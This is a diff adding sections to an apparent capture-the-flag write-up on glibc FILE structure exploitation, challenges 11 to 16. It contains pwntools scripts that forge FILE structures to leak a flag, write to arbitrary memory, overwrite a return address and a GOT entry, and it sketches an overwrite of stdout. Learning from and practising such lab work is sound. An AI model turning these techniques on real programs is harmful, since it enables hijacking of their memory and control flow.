@@ -433,6 +433,197 @@ Rest of the exploit remained the same.
 Now things gets interesting. There's a menu that allows us to do many operations. \ 
 In this challenge, we only need to obtain read primitive to leak the flag. This can be easily done by setting appropriate values for `write_base, write_ptr, read_end`. 
 
+This means we only have to set the appropriate criterias, to make a legitimate call to `fwrite` with the size of `0x100` on the created stream. We'd simply fake the 3 stated pointers above, with an intermediate buffer size larger than `0x100`, and it would give us the flag.
+
+```python
+def get_flag_addr(p):
+    p.recvuntil(b'The flag has been read into memory and is located at ')
+    flag_addr = int(p.readline()[:-1], 16)
+    return flag_addr
+
+def new_note(p, size):
+    p.sendline(b'new_note')
+    p.recvuntil(b'to the note?\n')
+    p.sendline(str(size).encode())
+    p.recvuntil(b'notes[')
+    note_index = int(p.recvuntil(b']')[:-1], 10)
+    p.recvuntil(b'= ')
+    note_addr = int(p.recvuntil(b';')[:-1], 16)
+    p.recvuntil(b'quit):\n')
+
+    return note_index, note_addr
+
+def open_file(p):
+    p.sendline(b'open_file')
+    p.recvuntil(b') = ')
+    fp_addr = int(p.readline()[:-1], 16)
+    p.recvuntil(b'quit):\n')
+
+    return fp_addr
+
+def write_fp(p, fp_bytes):
+    p.sendline(b'write_fp')  # TODO: we can have additional leaks from it
+    p.send(fp_bytes)
+    p.recvuntil(b'quit):\n')
+    return 
+
+def write_file(p):
+    p.sendline(b'write_file')
+    # p.recvuntil(b'quit):\n') Intentional, as we WANT to see the flag
+    return 
+
+p = process(BINARY)
+flag_addr = get_flag_addr(p)
+print(f'flag_addr: {hex(flag_addr)}')
+
+note_index, note_addr = new_note(p, 0x100)
+print(f'note_index: {note_index} note_addr: {hex(note_addr)}')
+
+fp_addr = open_file(p)
+print(f'fp_addr: {hex(fp_addr)}')
+
+fp = FileStructure()
+fp_bytes = fp.write(flag_addr, 0x200)
+write_fp(p, fp_bytes)
+
+write_file(p)
+p.interactive()
+```
+
+## Challenge 12
+
+A very similar approach, this time for write primitive.
+
+```python
+def new_note(p, index, size):
+    p.sendline(b'new_note')
+    p.recvuntil(b'(0-10)\n')
+    p.sendline(str(index).encode())
+    p.recvuntil(b'to the note?\n')
+    p.sendline(str(size).encode())
+    p.recvuntil(b'notes[')
+    note_index = int(p.recvuntil(b']')[:-1], 10)
+    p.recvuntil(b'= ')
+    note_addr = int(p.recvuntil(b';')[:-1], 16)
+    p.recvuntil(b'quit):\n')
+    return note_index, note_addr
+
+def read_file(p, index, buf):
+    p.sendline(b'read_file')
+    p.recvuntil(b'(0-10)\n')
+    p.sendline(str(index).encode())
+    p.recvuntil(b');')
+    p.send(buf)
+    p.recvuntil(b'quit):\n')
+    return
+
+p = process(BINARY)
+main_addr = get_main_addr(p)
+pie_base = main_addr - binary.symbols['main']
+assert(pie_base & 0xfff == 0)
+print(f'pie_base: {hex(pie_base)}')
+
+authenticated_addr = pie_base + binary.symbols['authenticated']
+print(f'authenticated_addr: {hex(authenticated_addr)}')
+
+read_size = 0x100
+note_index, note_addr = new_note(p, 0, read_size)
+print(f'note_index: {note_index} note_addr: {hex(note_addr)}')
+
+fp_addr = open_file(p)
+print(f'fp_addr: {hex(fp_addr)}')
+
+intermediate_buf_size = read_size + 0x20
+fp = FileStructure()
+fp_bytes = fp.read(authenticated_addr, intermediate_buf_size)
+write_fp(p, fp_bytes)
+
+buf = b'A' * read_size
+read_file(p, 0, buf)
+p.interactive()
+```
+
+## Challenge 13
+
+Now wer'e having a stack leak, and our goal is to run `win`. \
+I'm assuming the intended solution for this stage is to overwrite the RA, having a stack leak. We can carefully overwrite only the lower nibbles, bypassing the fact we have no PIE leak. This requires brute force of a single nibble, hence 16 tries. 
+Another option is to use `wide_data`, while storing my fake vtables and wide object within a note. \
+Since challenge 14 is exactly the same, but there's no `write_file` option, I'd try to exploit this by using a write primitive to the stack, via `read_file`. Another option is to call flush virtual methods within libc, using `close_file`. 
+
+## Challenge 14
+
+Same as 13. 
+
+```python
+def exploit():
+    p = process(BINARY)
+    cmd_addr = get_leak_addr(p)
+    ra_addr = cmd_addr + 0x98
+    print(f'cmd_addr: {hex(cmd_addr)} ra_addr: {hex(ra_addr)}')
+    
+    win_lsbs = 0xa3c9
+    read_size = 2
+    note_index, note_addr = new_note(p, 0, read_size)
+    print(f'note_index: {note_index} note_addr: {hex(note_addr)}')
+
+    fp_addr = open_file(p)
+    print(f'fp_addr: {hex(fp_addr)}')
+
+    intermediate_buf_size = read_size + 1  # Must be absolutely larger. Otherwise, no buffering write would occur
+    fp = FileStructure()
+    fp_bytes = fp.read(ra_addr, intermediate_buf_size)
+    write_fp(p, fp_bytes)
+
+    buf = struct.pack('<H', win_lsbs)
+    read_file(p, 0, buf)
+
+    p.sendline(b'quit')
+    p.recvuntil(b'your flag:')
+    p.readline()
+    flag = p.readline()
+    print(f'OUTPUT: {flag}')
+```
+
+## Challenge 15
+
+Now our goal is to overwrite GOT entry.. Repetitive write primitive, just as we've done within challenge 12.
+
+```python
+def exploit():
+    p = process(BINARY)
+    win_addr = p.elf.symbols['win']
+    print(f'win_addr: {hex(win_addr)}')
+
+    read_size = 8
+    note_index, note_addr = new_note(p, 0, read_size)
+    print(f'note_index: {note_index} note_addr: {hex(note_addr)}')
+
+    fp_addr = open_file(p)
+    print(f'fp_addr: {hex(fp_addr)}')
+
+    strcmp_got = p.elf.got['strcmp']
+    print(f'strcmp_got: {hex(strcmp_got)}')
+
+    intermediate_buf_size = read_size + 1  # Must be absolutely larger. Otherwise, no buffering write would occur
+    fp = FileStructure()
+    fp_bytes = fp.read(strcmp_got, intermediate_buf_size)
+    write_fp(p, fp_bytes)
+
+    buf = struct.pack('<Q', win_addr)
+    read_file(p, 0, buf)
+
+    p.sendline(b'bla')
+    p.interactive()
+```
+
+## Challenge 16
+
+Now we'd like to leak flag off memory, while not having a read primitive via `fwrite`. \
+Notice that the program does interacts with the `stdout` file stream, hence we'd exploit this builtin stream.
+
+This is actually pretty funny. Because we have write primitive yet no read primitive, we can use our `fp` to overwrite the `stdout` file stream, as it is part of libc (which is given). Once we overwrite `stdout`, we can easily adapt it for a generic read primitive. 
+
+
 
 
 [angry-fsrop]: https://blog.kylebot.net/2022/10/22/angry-FSROP
